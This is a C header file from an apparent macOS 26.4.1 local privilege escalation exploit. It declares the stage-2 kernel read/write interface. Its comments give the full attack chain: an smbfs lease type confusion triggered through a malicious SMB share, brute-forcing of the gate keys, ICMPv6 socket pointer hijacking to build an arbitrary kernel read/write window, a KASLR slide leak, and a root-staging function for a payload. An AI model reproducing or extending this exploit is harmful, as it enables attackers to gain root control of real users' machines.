/*
 * krw.h -- stage-2 kernel R/W for the Blazakis/Calif macOS 26.4.1 LPE.
 *
 * Primitive chain (all offsets in offsets.h, verified against the KDK
 * 25E253 t6050 DWARF and the 25E253 smbfs/webdav kext disassembly):
 *
 *   corrupt(T, val32, epoch16, key_hi, key_low)
 *     via the smbfs RqLs type confusion with K = T - 0x2c:
 *       *(u32*)(T)      = val32          (lease_state @ K+0x2c)
 *       *(u16*)(K+0x50) = epoch16        (v2 lease epoch)
 *       *(u64*)(K+0x20)|= 0x80           (SMB2_LEASE_GRANTED side effect)
 *       *(u64*)(K+0x10) = *(u64*)(K+0x18) = 0   (lease unlock side effect)
 *     gates: *(u64*)(K+8) == 0, *(u64*)(K+0x30) == key_hi,
 *            *(u64*)(K+0x38) == key_low.  On key mismatch the parser bails
 *     with EBADRPC after lock/unlock (no lasting damage) -> safe to brute.
 *
 *   probe:  T = P + 0x154 (inp6_hops) -> getsockopt(fd, IPV6_UNICAST_HOPS)
 *           reveals which of our sockets owns inpcb P.
 *           keys: u64@(P+0x158) = hash_element (0 for ripcb), u64@(P+0x160)
 *                 = saved_ppcb (0).  All known-by-construction.
 *           side effect: P+0x148 (filt ptr) |= 0x80 -> repaired post-R/W.
 *
 *   redirect: two corrupt() writes set A.in6p_icmp6filt = &B.in6p_icmp6filt
 *           (B+0x148).  Then setsockopt(A, ICMP6_FILTER, buf32) writes 32
 *           bytes at B+0x148 -> B.filt = arbitrary target, and
 *           getsockopt/setsockopt(B, ICMP6_FILTER) is a 32-byte kernel
 *           read/write window at target.  Move the window by rewriting
 *           B+0x148 through A again.
 *
 * Fresh ICMPv6 SOCK_DGRAM socket facts (icmp6_dgram_attach, unprivileged):
 *   cksum @0x150 = -1, hops @0x154 = -1 (until we setsockopt), options /
 *   outputopts / moptions = NULL, saved_ppcb = NULL, hash_element = 0,
 *   filt @0x148 = non-NULL kalloc.32 pointer (unknown high bits until we
 *   overwrite them ourselves).
 */

#ifndef LPE_KRW_H
#define LPE_KRW_H

#include <stdint.h>
#include <stddef.h>

typedef struct krw krw_t;

/* Open the corrupt-write driver: spawns `corrupt_bin --stdio` (which mounts
 * the malicious smb share and fsgetpath()s one K per stdin line) and arms
 * the JSON control file the smb server re-reads per request.
 * Returns NULL on failure. */
krw_t *krw_open(const char *corrupt_bin, const char *server_url,
                const char *mount_dir, const char *ctl_path);

/* One confusion write: val32 -> *(u32*)T, epoch16 -> *(u16*)(T+0x24).
 * key_hi/key_low must equal *(u64*)(T+4) / *(u64*)(T+0xc).
 * Returns 0 if the server accepted the exchange (write attempted), else -1.
 * NOTE: a key mismatch still returns 0 (kernel-side EBADRPC is invisible);
 * callers verify via the side channel (sockopt/readback). */
int krw_corrupt_u32(krw_t *k, uint64_t T, uint32_t val, uint16_t epoch,
                    uint64_t key_hi, uint64_t key_low);

/* Identity socket set: open n ICMPv6 dgram sockets, tag each with a unique
 * hop-limit marker starting at hops_base. Returns count opened. */
int krw_identity_open(krw_t *k, int n, int hops_base);

/* Probe candidate inpcb address P: write marker at P+0x154, then scan the
 * identity set for a socket whose hop limit became `marker`.
 * Returns the fd (>= 0) and sets *addr_out = P, or -1. */
int krw_probe_inpcb(krw_t *k, uint64_t P, uint32_t marker, uint64_t *addr_out);

/* Establish the R/W window between identity sockets fdA (addr A) and
 * fdB (addr B).  Returns 0 on success (verified by reading through B). */
int krw_redirect(krw_t *k, int fdA, uint64_t A, int fdB, uint64_t B);

/* 32-byte raw window ops (addr must be 8-aligned; the window covers
 * addr .. addr+32). */
int krw_read32(krw_t *k, uint64_t addr, uint8_t out[32]);
int krw_write32(krw_t *k, uint64_t addr, const uint8_t data[32]);

/* Convenience 64-bit read/write (uses two aligned windows when unaligned). */
uint64_t krw_read64(krw_t *k, uint64_t addr);
int krw_write64(krw_t *k, uint64_t addr, uint64_t val);
uint32_t krw_read32u(krw_t *k, uint64_t addr);

/* KASLR slide computed as read64(A+0x38) - XNU_RIPCBINFO (valid after
 * krw_redirect). */
uint64_t krw_slide(krw_t *k);

/* Undo all confusion side effects so the process can exit without
 * panicking the kernel (filt/outputopts/moptions repairs). */
void krw_cleanup(krw_t *k);

void krw_close(krw_t *k);

/* Accessors for root.c */
int     krw_fd_a(krw_t *k);
int     krw_fd_b(krw_t *k);
uint64_t krw_addr_a(krw_t *k);
uint64_t krw_addr_b(krw_t *k);

/* root.c */
int root_stage(krw_t *k, const char *payload_path, const char *trigger_name);

#endif /* LPE_KRW_H */
